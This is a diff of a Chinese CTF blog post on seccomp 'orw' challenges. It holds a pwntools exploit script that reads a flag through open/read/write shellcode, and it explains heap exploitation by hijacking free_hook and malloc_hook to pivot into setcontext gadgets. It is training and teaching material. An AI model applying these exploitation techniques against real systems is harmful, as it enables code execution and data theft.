@@ -6,7 +6,7 @@
   <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
   <meta http-equiv="X-UA-Compatible" content="ie=edge">
-  <title>沙箱入门题 - ShouCheng</title>
+  <title>orw - ShouCheng</title>
   <meta name="apple-mobile-web-app-capable" content="yes" />
   <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
   <meta name="google" content="notranslate" />
@@ -147,7 +147,7 @@
         <i class="iconfont iconsearch j-navbar-search"></i>
       
     </div>
-    <div class="center">沙箱入门题</div>
+    <div class="center">orw</div>
     <div class="right">
       <i class="iconfont iconmenu j-navbar-menu"></i>
     </div>
@@ -191,11 +191,11 @@
     <section class="head">
   <img   class="lazyload" data-original="/images/theme/post-image.jpg" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg=="  draggable="false">
   <div class="head-mask">
-    <h1 class="head-title">沙箱入门题</h1>
+    <h1 class="head-title">orw</h1>
     <div class="head-info">
-      <span class="post-info-item"><i class="iconfont iconcalendar"></i>May 22, 2021</span>
+      <span class="post-info-item"><i class="iconfont iconcalendar"></i>September 21, 2021</span>
       
-      <span class="post-info-item"><i class="iconfont iconfont-size"></i>2747</span>
+      <span class="post-info-item"><i class="iconfont iconfont-size"></i>6093</span>
     </div>
   </div>
 </section>
@@ -206,11 +206,11 @@
 <figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs powershell">第一次调用prctl函数 ————禁止提权<br>第二次调用prctl函数 ————限制能执行的系统调用只有open，<span class="hljs-built_in">write</span>，<span class="hljs-keyword">exit</span><br></code></pre></td></tr></table></figure>
 
 <p>意思就是我们不能使用特殊的系统调用getshell，但是可以用open、read、write三个系统调用去读flag</p>
-<h2 id="ctf题目"><a href="#ctf题目" class="headerlink" title="ctf题目"></a>ctf题目</h2><h3 id="一、pwnable-orw"><a href="#一、pwnable-orw" class="headerlink" title="一、pwnable_orw"></a>一、pwnable_orw</h3><p>来自buu上的</p>
-<p><img   class="lazyload" data-original="2021-05-22-%E6%B2%99%E7%AE%B1%E5%85%A5%E9%97%A8%E9%A2%98.assets/QQ%E5%9B%BE%E7%89%8720210522121233.png" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==" ></p>
-<p><img   class="lazyload" data-original="2021-05-22-%E6%B2%99%E7%AE%B1%E5%85%A5%E9%97%A8%E9%A2%98.assets/QQ%E5%9B%BE%E7%89%8720210522121208.png" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==" ></p>
+<h2 id="入门级orw"><a href="#入门级orw" class="headerlink" title="入门级orw"></a>入门级orw</h2><h3 id="一、pwnable-orw"><a href="#一、pwnable-orw" class="headerlink" title="一、pwnable_orw"></a>一、pwnable_orw</h3><p>来自buu上的</p>
+<p><img   class="lazyload" data-original="/2021/09/21/2021-09-21-orw/QQ%E5%9B%BE%E7%89%8720210522121233.png" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==" ></p>
+<p><img   class="lazyload" data-original="/2021/09/21/2021-09-21-orw/QQ%E5%9B%BE%E7%89%8720210522121208.png" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==" ></p>
 <p>首先checksec完，发现只开了canary，放入ida看看。发现，可以输入数据，然后还能对输入的数据进行执行调用。因为这开启沙箱，系统调用是无法执行的，只能通过open打开flag，然后read读到缓冲区上，再通过write泄露出来，从而得到flag</p>
-<p><img   class="lazyload" data-original="2021-05-22-%E6%B2%99%E7%AE%B1%E5%85%A5%E9%97%A8%E9%A2%98.assets/QQ%E5%9B%BE%E7%89%8720210522122706.png" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==" ></p>
+<p><img   class="lazyload" data-original="/2021/09/21/2021-09-21-orw/QQ%E5%9B%BE%E7%89%8720210522122706.png" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==" ></p>
 <p>第一个exp是自己去构造执行指令，第二个是用pwntool里面自带的shellcraft的功能。相比之下，第二个会更方便许多</p>
 <p>exp的详细解析：（来自<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_44768749/article/details/108256099%EF%BC%89">https://blog.csdn.net/qq_44768749/article/details/108256099）</a></p>
 <p>打开flag文件，sys_open(file,0,0)；系统调用号为5</p>
@@ -232,30 +232,53 @@
 
 
 <h3 id="二、easy-shellcode"><a href="#二、easy-shellcode" class="headerlink" title="二、easy_shellcode"></a>二、easy_shellcode</h3><p>来自2021NEEPU 纳新CTF上的一道题</p>
-<p><img   class="lazyload" data-original="2021-05-22-%E6%B2%99%E7%AE%B1%E5%85%A5%E9%97%A8%E9%A2%98.assets/QQ%E5%9B%BE%E7%89%8720210522123857.png" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==" ></p>
-<p>虽然保护全开，但是，是用orw的，无所谓</p>
-<p><img   class="lazyload" data-original="2021-05-22-%E6%B2%99%E7%AE%B1%E5%85%A5%E9%97%A8%E9%A2%98.assets/QQ%E5%9B%BE%E7%89%8720210522123942.png" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==" ></p>
-<p><img   class="lazyload" data-original="2021-05-22-%E6%B2%99%E7%AE%B1%E5%85%A5%E9%97%A8%E9%A2%98.assets/QQ%E5%9B%BE%E7%89%8720210522130822.png" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==" ></p>
+<p><img   class="lazyload" data-original="/2021/09/21/2021-09-21-orw/QQ%E5%9B%BE%E7%89%8720210522123857.png" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==" ></p>
+<p>64位，保护全开</p>
+<p><img   class="lazyload" data-original="/2021/09/21/2021-09-21-orw/QQ%E5%9B%BE%E7%89%8720210522123942.png" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==" ></p>
+<p><img   class="lazyload" data-original="/2021/09/21/2021-09-21-orw/QQ%E5%9B%BE%E7%89%8720210522130822.png" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==" ></p>
 <p>跟上面很类似，也是有个直接输入点，然后调用执行输入的数据，借用shellcraft，把寄存器改为64位下的即可获取flag</p>
 <p>exp：</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!usr/bin/env python</span><br><span class="hljs-comment">#coding=utf-8</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>p=remote(<span class="hljs-string">&quot;neepusec.club&quot;</span>,<span class="hljs-number">18626</span>)<br>context.log_level=<span class="hljs-string">&#x27;debug&#x27;</span><br>context.os=<span class="hljs-string">&#x27;linux&#x27;</span><br>context.arch=<span class="hljs-string">&#x27;amd64&#x27;</span><br>shellcode=asm(shellcraft.<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;./flag&#x27;</span>))<br>shellcode+=asm(shellcraft.read(<span class="hljs-string">&#x27;rax&#x27;</span>,<span class="hljs-string">&#x27;rsp&#x27;</span>,<span class="hljs-number">0x30</span>))<br>shellcode+=asm(shellcraft.write(<span class="hljs-number">1</span>,<span class="hljs-string">&#x27;rsp&#x27;</span>,<span class="hljs-number">0x30</span>))<br>p.sendlineafter(<span class="hljs-string">&quot;orw&quot;</span>,shellcode)<br>p.interactive()<br><br></code></pre></td></tr></table></figure>
+
+<h2 id="堆上orw"><a href="#堆上orw" class="headerlink" title="堆上orw"></a>堆上orw</h2><p>前面呢，都是一些有关于orw思想的入门基础题，而比赛中常见的都是堆上的orw</p>
+<h3 id="低版本"><a href="#低版本" class="headerlink" title="低版本"></a>低版本</h3><p>一般在 <code>Glibc2.29</code>以前的 <code>ORW</code>解题思路已经比较清晰，主要是劫持 <code>free_hook</code> 或者 <code>malloc_hook</code>写入 <code>setcontext+53</code>函数中的 gadget，通过 <code>rdi</code>索引，来设置相关寄存器，并执行提前布置好的 <code>ORW ROP chains</code></p>
+<p>setcontext+53处的gadget如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs assembly">&lt;setcontext+53&gt;:  mov    rsp,QWORD PTR [rdi+0xa0]<br>&lt;setcontext+60&gt;:  mov    rbx,QWORD PTR [rdi+0x80]<br>&lt;setcontext+67&gt;:  mov    rbp,QWORD PTR [rdi+0x78]<br>&lt;setcontext+71&gt;:  mov    r12,QWORD PTR [rdi+0x48]<br>&lt;setcontext+75&gt;:  mov    r13,QWORD PTR [rdi+0x50]<br>&lt;setcontext+79&gt;:  mov    r14,QWORD PTR [rdi+0x58]<br>&lt;setcontext+83&gt;:  mov    r15,QWORD PTR [rdi+0x60]<br>&lt;setcontext+87&gt;:  mov    rcx,QWORD PTR [rdi+0xa8]<br>&lt;setcontext+94&gt;:  push   rcx<br>&lt;setcontext+95&gt;:  mov    rsi,QWORD PTR [rdi+0x70]<br>&lt;setcontext+99&gt;:  mov    rdx,QWORD PTR [rdi+0x88]<br>&lt;setcontext+106&gt;: mov    rcx,QWORD PTR [rdi+0x98]<br>&lt;setcontext+113&gt;: mov    r8,QWORD PTR [rdi+0x28]<br>&lt;setcontext+117&gt;: mov    r9,QWORD PTR [rdi+0x30]<br>&lt;setcontext+121&gt;: mov    rdi,QWORD PTR [rdi+0x68]<br>&lt;setcontext+125&gt;: xor    eax,eax<br>&lt;setcontext+127&gt;: ret<br></code></pre></td></tr></table></figure>
+
+<p>目的是获得一个可执行的权限，需要注意的是<code>mov rsp, [rdi+0xa0]</code>和<code>mov rcx, [rdi+0xa8]</code>。修改rsp的值将会改变栈指针，因此我们就获得了控制栈的能力，修改rcx的值后接着有个push操作将rcx压栈，然后汇编指令按照顺序会执行代码中最后的ret操作，而ret去执行的地址就是压入栈的rcx值，因此修改rcx就获得了控制程序流程的能力</p>
+<p>但是为了能执行到这，我们先要做的就是劫持free_hook或者malloc_hook为<code>setcontext + 53</code>的地址，跳转到这边来执行上面的gadgets，但这都不是重点，重点是<code>setcontext + 53</code>上的传参设置。因为都是借用rdi传参，刚好我们执行malloc或者free申请或是释放堆块时，传入的第一个参数是堆的地址，是存在rdi上的，所以我们要释放或者申请的堆块的地址十分关键，在其偏移0xa0和0xa8的位置分别填上我们存储orw链内容的地址（注意不是orw的第一个指令地址）和一个ret汇编指令的地址</p>
+<p>注：为什么不能直接是orw的地址：因为执行完setcontext + 53上的gadget会执行ret，而ret执行的rcx指向的地址，如果rcx装的是mprotect的地址，执行完mprotect就会去执行rsp指向的地址，注意是地址！如果前面直接传入rsp的是orw的第一个指令地址，那么ret执行的是把写在上面的指令作为一个地址解析，直接就会报错了，因为rip获取的是栈顶的值，所以要中转一下，前面写的是另外一个地址（一般就直接在shellcode前八个字节的地方），然后在这个地址上写入的才是shellcode的地址</p>
+<p>可以自己算偏移，也可以借用pwntools的SigreturnFrame类直接来构造。此时frame中的rsp和rip对应的就是setcontext的rsp和rcx</p>
+<figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">context.arch</span> = <span class="hljs-string">&quot;amd64&quot;</span><br><span class="hljs-attr">frame</span> = SigreturnFrame()<br><span class="hljs-attr">frame.rsp</span> = shellcode_addr<br><span class="hljs-attr">frame.rip</span> = ret_addr<br></code></pre></td></tr></table></figure>
+
+
+
+<h3 id="高版本"><a href="#高版本" class="headerlink" title="高版本"></a>高版本</h3><p>但在 <code>Glibc 2.29</code>之后 <code>setcontext</code>中的gadget变成了以 <code>rdx</code>索引，因此如果我们按照之前思路的话，还要先通过 <code>ROP</code>控制 <code>RDX</code>的值，如下所示：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs assembly">.text:00000000000580DD                 mov     rsp, [rdx+0A0h]<br>.text:00000000000580E4                 mov     rbx, [rdx+80h]<br>.text:00000000000580EB                 mov     rbp, [rdx+78h]<br>.text:00000000000580EF                 mov     r12, [rdx+48h]<br>.text:00000000000580F3                 mov     r13, [rdx+50h]<br>.text:00000000000580F7                 mov     r14, [rdx+58h]<br>.text:00000000000580FB                 mov     r15, [rdx+60h]<br>.text:00000000000580FF                 test    dword ptr fs:48h, 2<br>    ....<br>.text:00000000000581C6                 mov     rcx, [rdx+0A8h]<br>.text:00000000000581CD                 push    rcx<br>.text:00000000000581CE                 mov     rsi, [rdx+70h]<br>.text:00000000000581D2                 mov     rdi, [rdx+68h]<br>.text:00000000000581D6                 mov     rcx, [rdx+98h]<br>.text:00000000000581DD                 mov     r8, [rdx+28h]<br>.text:00000000000581E1                 mov     r9, [rdx+30h]<br>.text:00000000000581E5                 mov     rdx, [rdx+88h]<br>.text:00000000000581EC                 xor     eax, eax<br>.text:00000000000581EE                 retn<br></code></pre></td></tr></table></figure>
+
+<p>来源：<a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/236832">https://www.anquanke.com/post/id/236832</a></p>
+<p>​            <a target="_blank" rel="noopener" href="http://blog.eonew.cn/archives/993">http://blog.eonew.cn/archives/993</a></p>
+<p>​            <a target="_blank" rel="noopener" href="https://blog.csdn.net/A951860555/article/details/118268484">https://blog.csdn.net/A951860555/article/details/118268484</a></p>
+
       </section>
       <section class="extra">
         
           <ul class="copyright">
   
     <li><strong>本文作者：</strong>ShouCheng</li>
-    <li><strong>本文链接：</strong><a href="http://example.com/2021/05/22/2021-05-22-%E6%B2%99%E7%AE%B1%E5%85%A5%E9%97%A8%E9%A2%98/index.html" title="http:&#x2F;&#x2F;example.com&#x2F;2021&#x2F;05&#x2F;22&#x2F;2021-05-22-%E6%B2%99%E7%AE%B1%E5%85%A5%E9%97%A8%E9%A2%98&#x2F;index.html">http:&#x2F;&#x2F;example.com&#x2F;2021&#x2F;05&#x2F;22&#x2F;2021-05-22-%E6%B2%99%E7%AE%B1%E5%85%A5%E9%97%A8%E9%A2%98&#x2F;index.html</a></li>
+    <li><strong>本文链接：</strong><a href="http://example.com/2021/09/21/2021-09-21-orw/index.html" title="http:&#x2F;&#x2F;example.com&#x2F;2021&#x2F;09&#x2F;21&#x2F;2021-09-21-orw&#x2F;index.html">http:&#x2F;&#x2F;example.com&#x2F;2021&#x2F;09&#x2F;21&#x2F;2021-09-21-orw&#x2F;index.html</a></li>
     <li><strong>版权声明：</strong>本博客所有文章均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" title="BY-NC-SA" target="_blank" rel="noopener">BY-NC-SA</a> 许可协议，转载请注明出处！</li>
   
 </ul>
         
         
         
+  <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/orw/" rel="tag">orw</a></li></ul> 
+
         
   <nav class="nav">
-    <a href="/2021/05/23/2021-05-23-canary%E5%90%88%E9%9B%86/"><i class="iconfont iconleft"></i>canary合集——转载</a>
-    <a href="/2021/05/09/2021-05-09-buu05/">buu05<i class="iconfont iconright"></i></a>
+    <a></a>
+    <a href="/2021/09/21/2021-09-21-2021%E9%95%BF%E5%9F%8E%E6%9D%AFPWN/">2021长城杯PWN<i class="iconfont iconright"></i></a>
   </nav>
 
       </section>
@@ -275,7 +298,7 @@
           
   <aside class="toc-wrap">
     <h3 class="toc-title">文章目录：</h3>
-    <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%83%8C%E6%99%AF%E5%89%8D%E7%BD%AE"><span class="toc-text">背景前置</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ctf%E9%A2%98%E7%9B%AE"><span class="toc-text">ctf题目</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%80%E3%80%81pwnable-orw"><span class="toc-text">一、pwnable_orw</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BA%8C%E3%80%81easy-shellcode"><span class="toc-text">二、easy_shellcode</span></a></li></ol></li></ol>
+    <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%83%8C%E6%99%AF%E5%89%8D%E7%BD%AE"><span class="toc-text">背景前置</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%85%A5%E9%97%A8%E7%BA%A7orw"><span class="toc-text">入门级orw</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%80%E3%80%81pwnable-orw"><span class="toc-text">一、pwnable_orw</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BA%8C%E3%80%81easy-shellcode"><span class="toc-text">二、easy_shellcode</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%A0%86%E4%B8%8Aorw"><span class="toc-text">堆上orw</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BD%8E%E7%89%88%E6%9C%AC"><span class="toc-text">低版本</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%AB%98%E7%89%88%E6%9C%AC"><span class="toc-text">高版本</span></a></li></ol></li></ol>
   </aside>
 
         
